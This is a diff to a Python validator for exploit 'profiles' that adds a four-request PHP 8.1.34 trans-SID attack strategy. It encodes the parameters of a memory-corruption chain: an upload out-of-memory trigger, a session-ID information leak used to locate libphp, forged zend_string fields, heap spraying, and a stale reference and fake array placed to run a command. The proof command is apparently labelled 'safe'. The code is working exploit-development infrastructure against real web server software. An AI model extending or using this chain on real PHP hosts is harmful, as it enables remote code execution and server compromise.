@@ -124,6 +124,26 @@ def _keys(obj: Mapping[str, Any], where: str, required: Iterable[str]) -> None:
         raise ProfileError(f"{where}: {'; '.join(bits)}")
 
 
+def _keys_with_optional(
+    obj: Mapping[str, Any],
+    where: str,
+    required: Iterable[str],
+    optional: Iterable[str],
+) -> None:
+    want = set(required)
+    allowed = want | set(optional)
+    got = set(obj)
+    missing = sorted(want - got)
+    extra = sorted(got - allowed)
+    if missing or extra:
+        bits = []
+        if missing:
+            bits.append("missing " + ", ".join(missing))
+        if extra:
+            bits.append("unknown " + ", ".join(extra))
+        raise ProfileError(f"{where}: {'; '.join(bits)}")
+
+
 def parse_hex(value: Any, where: str) -> int:
     if not isinstance(value, str) or not HEX_RE.fullmatch(value):
         raise ProfileError(f"{where} must be canonical lowercase hexadecimal (0x...)")
@@ -179,6 +199,19 @@ ABI_REQUIRED = {
     "types": ("is_string", "is_array", "is_reference", "gc_string", "array_ex"),
 }
 
+RUNTIME_BASE_KEYS = (
+    "mpm", "workers", "memory_limit", "post_max_size", "upload_max_filesize",
+    "max_input_vars", "display_errors", "file_uploads", "session_extension",
+    "upload_progress_enabled", "session_name", "upload_progress_name",
+)
+
+PHP81_TRANS_SID_RUNTIME_KEYS = (
+    "session_use_trans_sid", "session_use_cookies", "session_use_only_cookies",
+    "upload_progress_cleanup", "url_rewriter_tags",
+)
+
+PHP81_URL_REWRITER_TAGS = "a=href,area=href,frame=src,form="
+
 # Profile schema v1 inherited the key ``call_info`` for execute-data offset
 # 0x40.  On the supported PHP 8 ABI that member is actually
 # ``zend_execute_data.run_time_cache``.  Keep the serialized key for v1
@@ -198,8 +231,9 @@ class Profile:
     @property
     def strategy(self) -> str:
         recipe = self.raw["request_recipe"]
-        if recipe.get("strategy") == "pure-http-oom-v1":
-            return "pure-http-oom-v1"
+        direct = recipe.get("strategy")
+        if direct in ("pure-http-oom-v1", "php81-trans-sid-v1"):
+            return str(direct)
         return str(recipe["stage3"]["strategy"])
 
     def hx(self, *keys: str) -> int:
@@ -298,18 +332,24 @@ def validate_profile(data: dict[str, Any], *, source: str = "profile") -> None:
     recipe_strategy = recipe.get("strategy", "legacy-multipart-v1")
 
     runtime = _need_obj(data["runtime"], f"{source}.runtime")
-    _keys(runtime, f"{source}.runtime", (
-        "mpm", "workers", "memory_limit", "post_max_size", "upload_max_filesize",
-        "max_input_vars", "display_errors", "file_uploads", "session_extension",
-        "upload_progress_enabled", "session_name", "upload_progress_name",
-    ))
+    runtime_keys = RUNTIME_BASE_KEYS
+    if recipe_strategy == "php81-trans-sid-v1":
+        runtime_keys += PHP81_TRANS_SID_RUNTIME_KEYS
+        _keys(runtime, f"{source}.runtime", runtime_keys)
+    else:
+        _keys_with_optional(
+            runtime,
+            f"{source}.runtime",
+            runtime_keys,
+            PHP81_TRANS_SID_RUNTIME_KEYS,
+        )
     if runtime["mpm"] != "prefork" or _need_int(runtime["workers"], "workers", 1) != 1:
         raise ProfileError(f"{source}: current chain requires exactly one prefork worker")
     for key in ("memory_limit", "post_max_size", "upload_max_filesize", "session_name", "upload_progress_name"):
         _need_str(runtime[key], f"{source}.runtime.{key}")
     max_input_vars = _need_int(runtime["max_input_vars"], f"{source}.runtime.max_input_vars", 1)
     display_errors = _need_bool(runtime["display_errors"], f"{source}.runtime.display_errors")
-    expected_display = recipe_strategy != "pure-http-oom-v1"
+    expected_display = recipe_strategy not in ("pure-http-oom-v1", "php81-trans-sid-v1")
     if display_errors is not expected_display:
         raise ProfileError(
             f"{source}.runtime.display_errors must be "
@@ -322,8 +362,49 @@ def validate_profile(data: dict[str, Any], *, source: str = "profile") -> None:
         if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,63}", runtime[key]):
             raise ProfileError(f"{source}.runtime.{key} must be a simple PHP field name")
 
+    for key in PHP81_TRANS_SID_RUNTIME_KEYS[:-1]:
+        if key in runtime:
+            _need_bool(runtime[key], f"{source}.runtime.{key}")
+    if "url_rewriter_tags" in runtime:
+        _need_str(runtime["url_rewriter_tags"], f"{source}.runtime.url_rewriter_tags")
+
+    if recipe_strategy == "php81-trans-sid-v1":
+        php81_runtime = {
+            "session_use_trans_sid": True,
+            "session_use_cookies": False,
+            "session_use_only_cookies": False,
+            "upload_progress_cleanup": True,
+        }
+        for key, expected in php81_runtime.items():
+            value = runtime[key]
+            if value is not expected:
+                raise ProfileError(
+                    f"{source}.runtime.{key} must be "
+                    f"{'true' if expected else 'false'} for php81-trans-sid-v1"
+                )
+        tags = runtime["url_rewriter_tags"]
+        if tags != PHP81_URL_REWRITER_TAGS:
+            raise ProfileError(
+                f"{source}.runtime.url_rewriter_tags must exactly match the "
+                "profiled trans-SID rewrite surface"
+            )
+
     if recipe_strategy == "pure-http-oom-v1":
         _validate_pure_http_recipe(recipe, parsed_abi, page, chunk, max_input_vars)
+    elif recipe_strategy == "php81-trans-sid-v1":
+        if (
+            runtime["memory_limit"] != "128M"
+            or runtime["post_max_size"] != "192M"
+            or runtime["upload_max_filesize"] != "192M"
+            or max_input_vars != 1000
+        ):
+            raise ProfileError(
+                f"{source}: php81-trans-sid-v1 requires the exact "
+                "128M/192M/192M/1000 runtime"
+            )
+        _validate_php81_trans_sid_recipe(
+            recipe, parsed_abi, page, chunk, max_input_vars
+        )
     elif recipe_strategy == "legacy-multipart-v1":
         _validate_legacy_recipe(recipe, parsed_abi, page, chunk, max_input_vars)
     else:
@@ -520,6 +601,216 @@ def _validate_pure_http_recipe(
     )
     if command_offset + len(safe_proof_command("/out/" + "a" * 48)) + 1 > value_len:
         raise ProfileError("pure HTTP B2 carrier cannot hold the fixed proof command")
+
+
+def _validate_php81_trans_sid_recipe(
+    recipe: dict[str, Any],
+    abi: Mapping[str, Mapping[str, int]],
+    page: int,
+    chunk: int,
+    max_input_vars: int,
+) -> None:
+    """Validate the bounded four-request PHP 8.1 trans-SID chain.
+
+    This strategy is intentionally a separate recipe.  Its FILE_START OOM,
+    trans-SID disclosure, streamed terminal producer, and terminal reclaim all
+    rely on one exact PHP 8.1.34 allocator geometry.
+    """
+    _keys(recipe, "request_recipe", ("strategy", "query_fields", "a1", "b1", "a2", "b2"))
+    if recipe["strategy"] != "php81-trans-sid-v1":
+        raise ProfileError("PHP 8.1 trans-SID recipe has the wrong strategy name")
+    _bounded_int(recipe["query_fields"], "request_recipe.query_fields", 0, 32)
+
+    a1 = _need_obj(recipe["a1"], "request_recipe.a1")
+    _keys(a1, "request_recipe.a1", (
+        "boundary_len", "nested_parts", "depth", "key_pad", "ctype_lengths",
+        "small_fillers", "large_fields", "burners", "pad", "progress_len",
+        "pre_file_scalars", "pre_file_mix", "file",
+    ))
+    _bounded_int(a1["boundary_len"], "a1.boundary_len", 8, 128)
+    nested_parts = _bounded_int(a1["nested_parts"], "a1.nested_parts", 1, 4096)
+    _bounded_int(a1["depth"], "a1.depth", 2, 64)
+    _bounded_int(a1["key_pad"], "a1.key_pad", 0, 512)
+    ctypes = _need_list(a1["ctype_lengths"], "a1.ctype_lengths")
+    if len(ctypes) != 2:
+        raise ProfileError("a1.ctype_lengths must contain exactly two measured values")
+    for index, value in enumerate(ctypes):
+        _bounded_int(value, f"a1.ctype_lengths[{index}]", 1, 4096)
+
+    small_count, _small_value, _small_name = _validate_counted_shape(
+        a1["small_fillers"], "a1.small_fillers"
+    )
+    large = _need_obj(a1["large_fields"], "a1.large_fields")
+    _keys(large, "a1.large_fields", ("count", "value_len"))
+    large_count = _bounded_int(large["count"], "a1.large_fields.count", 1, 512)
+    _bounded_int(large["value_len"], "a1.large_fields.value_len", 1, 65536)
+    burner_count, _burner_value, _ = _validate_counted_shape(
+        a1["burners"], "a1.burners", name=False
+    )
+    pad_shape = _need_obj(a1["pad"], "a1.pad")
+    _keys(pad_shape, "a1.pad", ("name_len", "value_len"))
+    _bounded_int(pad_shape["name_len"], "a1.pad.name_len", 1, 4096)
+    _bounded_int(pad_shape["value_len"], "a1.pad.value_len", 1, 65536)
+    _bounded_int(a1["progress_len"], "a1.progress_len", 1, 65536)
+
+    scalar_groups = _need_list(a1["pre_file_scalars"], "a1.pre_file_scalars")
+    if not 1 <= len(scalar_groups) <= 8:
+        raise ProfileError("a1.pre_file_scalars must contain 1..8 groups")
+    pre_scalar_count = 0
+    for index, value in enumerate(scalar_groups):
+        where = f"a1.pre_file_scalars[{index}]"
+        group = _need_obj(value, where)
+        _keys(group, where, ("count", "name_len", "value_len", "prefix", "fill"))
+        pre_scalar_count += _bounded_int(group["count"], f"{where}.count", 1, 64)
+        _bounded_int(group["name_len"], f"{where}.name_len", 1, 4096)
+        _bounded_int(group["value_len"], f"{where}.value_len", 0, 65536)
+        prefix = _need_str(group["prefix"], f"{where}.prefix")
+        fill = _need_str(group["fill"], f"{where}.fill")
+        if not re.fullmatch(r"[A-Za-z]", prefix) or not re.fullmatch(r"[A-Za-z]", fill):
+            raise ProfileError(f"{where}.prefix/fill must each be one ASCII letter")
+
+    mix = _need_list(a1["pre_file_mix"], "a1.pre_file_mix")
+    if not 1 <= len(mix) <= 16:
+        raise ProfileError("a1.pre_file_mix must contain 1..16 measured lengths")
+    for index, value in enumerate(mix):
+        _bounded_int(value, f"a1.pre_file_mix[{index}]", 0, 65536)
+
+    a1_file = _need_obj(a1["file"], "a1.file")
+    _keys(a1_file, "a1.file", ("name_len", "filename_len", "content_type_len", "value_len"))
+    _bounded_int(a1_file["name_len"], "a1.file.name_len", 1, 4096)
+    _bounded_int(a1_file["filename_len"], "a1.file.filename_len", 1, 4096)
+    _bounded_int(a1_file["content_type_len"], "a1.file.content_type_len", 1, 4096)
+    _bounded_int(a1_file["value_len"], "a1.file.value_len", 0, 4096)
+    a1_fields = (
+        4 + nested_parts + small_count + large_count + burner_count
+        + pre_scalar_count + len(mix)
+    )
+    if a1_fields > max_input_vars:
+        raise ProfileError("PHP 8.1 A1 fields exceed runtime.max_input_vars")
+
+    b1 = _need_obj(recipe["b1"], "request_recipe.b1")
+    _keys(b1, "request_recipe.b1", (
+        "boundary_len", "target_offset", "fake_len", "allocator_overhead",
+        "value_data_offset", "name_len", "head_forged_fields", "forged_pages",
+        "partial_flood_pages", "tail_forged_fields", "hit_index", "nested_fillers",
+        "expected_prefix", "main_qword_offset", "min_dtor_hits",
+        "libphp_delta_min", "libphp_delta_max",
+    ))
+    _bounded_int(b1["boundary_len"], "b1.boundary_len", 8, 128)
+    target_offset = parse_hex(b1["target_offset"], "b1.target_offset")
+    fake_len = parse_hex(b1["fake_len"], "b1.fake_len")
+    if not 0x20 <= target_offset < chunk or not page <= fake_len <= chunk:
+        raise ProfileError("b1 target/fake length must stay inside one Zend MM chunk")
+    overhead = _bounded_int(b1["allocator_overhead"], "b1.allocator_overhead", 1, 1024)
+    value_data_offset = _bounded_int(
+        b1["value_data_offset"], "b1.value_data_offset", abi["zend_string"]["val"], chunk
+    )
+    _bounded_int(b1["name_len"], "b1.name_len", 1, 4096)
+    head_count = _bounded_int(b1["head_forged_fields"], "b1.head_forged_fields", 1, 64)
+    forged_pages = _bounded_int(b1["forged_pages"], "b1.forged_pages", 1, chunk // page)
+    _bounded_int(
+        b1["partial_flood_pages"], "b1.partial_flood_pages", 1, chunk // page
+    )
+    tail_count = _bounded_int(b1["tail_forged_fields"], "b1.tail_forged_fields", 1, 64)
+    hit_index = _bounded_int(
+        b1["hit_index"], "b1.hit_index", 0, head_count + tail_count
+    )
+    if hit_index != head_count + 1:
+        raise ProfileError("b1.hit_index must select the first forged field after the partial flood")
+    header = target_offset - value_data_offset
+    if header < 0 or header + 0x20 > forged_pages * page - overhead:
+        raise ProfileError("b1 forged field cannot contain the fake zend_string")
+    nested_fillers = _bounded_int(b1["nested_fillers"], "b1.nested_fillers", 0, 4096)
+    if 2 + head_count + 1 + tail_count + nested_fillers > max_input_vars:
+        raise ProfileError("PHP 8.1 B1 fields exceed runtime.max_input_vars")
+    prefix = _need_str(b1["expected_prefix"], "b1.expected_prefix")
+    if not re.fullmatch(r"/[0-9]{2}B{5}", prefix):
+        raise ProfileError("b1.expected_prefix must be an indexed eight-byte leak tag")
+    if int(prefix[1:3]) != hit_index % 100:
+        raise ProfileError("b1.expected_prefix index must match b1.hit_index")
+    main_offset = parse_hex(b1["main_qword_offset"], "b1.main_qword_offset")
+    if main_offset % 8 or main_offset + 8 > fake_len:
+        raise ProfileError("b1.main_qword_offset must be aligned inside the disclosed value")
+    _bounded_int(b1["min_dtor_hits"], "b1.min_dtor_hits", 2, 4096)
+    delta_lo = parse_hex(b1["libphp_delta_min"], "b1.libphp_delta_min")
+    delta_hi = parse_hex(b1["libphp_delta_max"], "b1.libphp_delta_max")
+    if not 0 < delta_lo < delta_hi <= 0x100000000:
+        raise ProfileError("b1 libphp/main delta window is invalid")
+
+    a2 = _need_obj(recipe["a2"], "request_recipe.a2")
+    _keys(a2, "request_recipe.a2", (
+        "boundary_len", "session_value_len", "progress_value", "fillers", "file", "large_field",
+    ))
+    _bounded_int(a2["boundary_len"], "a2.boundary_len", 8, 128)
+    _bounded_int(a2["session_value_len"], "a2.session_value_len", 1, 128)
+    progress_value = _need_str(a2["progress_value"], "a2.progress_value")
+    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", progress_value):
+        raise ProfileError("a2.progress_value must be a bounded ASCII token")
+    fillers = _need_obj(a2["fillers"], "a2.fillers")
+    _keys(fillers, "a2.fillers", ("count", "name_len", "value_len"))
+    filler_count = _bounded_int(fillers["count"], "a2.fillers.count", 0, 4096)
+    _bounded_int(fillers["name_len"], "a2.fillers.name_len", 1, 128)
+    _bounded_int(fillers["value_len"], "a2.fillers.value_len", 0, 4096)
+    a2_file = _need_obj(a2["file"], "a2.file")
+    _keys(a2_file, "a2.file", ("name", "filename", "value_len"))
+    for key, maximum in (("name", 128), ("filename", 255)):
+        token = _need_str(a2_file[key], f"a2.file.{key}")
+        if len(token) > maximum or not re.fullmatch(r"[A-Za-z0-9_.-]+", token):
+            raise ProfileError(f"a2.file.{key} must be a bounded ASCII token")
+    _bounded_int(a2_file["value_len"], "a2.file.value_len", 0, 65536)
+    large_field = _need_obj(a2["large_field"], "a2.large_field")
+    _keys(large_field, "a2.large_field", ("name", "value_len", "stream_chunk"))
+    large_name = _need_str(large_field["name"], "a2.large_field.name")
+    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,63}", large_name):
+        raise ProfileError("a2.large_field.name must be a simple form field name")
+    large_len = _bounded_int(
+        large_field["value_len"], "a2.large_field.value_len", 128 * 1024 * 1024, 192 * 1024 * 1024
+    )
+    stream_chunk = _bounded_int(
+        large_field["stream_chunk"], "a2.large_field.stream_chunk", page, 1024 * 1024
+    )
+    if not _power_of_two(stream_chunk) or large_len % stream_chunk:
+        raise ProfileError("a2 stream chunk must be a power of two that divides the large field")
+    if filler_count + 4 > max_input_vars:
+        raise ProfileError("PHP 8.1 A2 fields exceed runtime.max_input_vars")
+
+    b2 = _need_obj(recipe["b2"], "request_recipe.b2")
+    _keys(b2, "request_recipe.b2", (
+        "boundary_len", "session_value", "progress_value", "spray_count", "name_len",
+        "value_len", "reference_offset", "fake_array_offset", "refcount",
+    ))
+    _bounded_int(b2["boundary_len"], "b2.boundary_len", 8, 128)
+    for key in ("session_value", "progress_value"):
+        token = _need_str(b2[key], f"b2.{key}")
+        if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", token):
+            raise ProfileError(f"b2.{key} must be a bounded ASCII token")
+    spray_count = _bounded_int(b2["spray_count"], "b2.spray_count", 1, 4096)
+    if spray_count + 2 > max_input_vars:
+        raise ProfileError("PHP 8.1 B2 fields exceed runtime.max_input_vars")
+    _bounded_int(b2["name_len"], "b2.name_len", 1, 128)
+    value_len = _bounded_int(b2["value_len"], "b2.value_len", 1, page)
+    reference_offset = parse_hex(b2["reference_offset"], "b2.reference_offset")
+    fake_array_offset = parse_hex(b2["fake_array_offset"], "b2.fake_array_offset")
+    if reference_offset >= chunk or fake_array_offset >= chunk:
+        raise ProfileError("b2 forged offsets must stay inside one Zend MM chunk")
+    if reference_offset % 8 or fake_array_offset % 8:
+        raise ProfileError("b2 forged offsets must be pointer-aligned")
+    if reference_offset // page != fake_array_offset // page:
+        raise ProfileError("b2 stale reference and fake array must share one reclaim page")
+    refcount = _bounded_int(b2["refcount"], "b2.refcount", 1, 2)
+    del refcount
+    zstring_val = abi["zend_string"]["val"]
+    ref_start = reference_offset % page - zstring_val
+    ref_end = ref_start + abi["zend_reference"]["size"]
+    array_start = fake_array_offset % page - zstring_val
+    _execute, _string, command_offset = layout_offsets(
+        {key: {name: hex(number) for name, number in fields.items()} for key, fields in abi.items()}
+    )
+    array_end = array_start + command_offset + len(safe_proof_command("/out/" + "a" * 48)) + 1
+    if ref_start < 0 or ref_end > value_len or array_start < 0 or array_end > value_len:
+        raise ProfileError("b2 fake reference/array does not fit in the spray value")
+    if max(ref_start, array_start) < min(ref_end, array_end):
+        raise ProfileError("b2 fake reference overlaps the fake array payload")
 
 
 def _validate_abi_bounds(abi: Mapping[str, Mapping[str, int]], source: str) -> None:
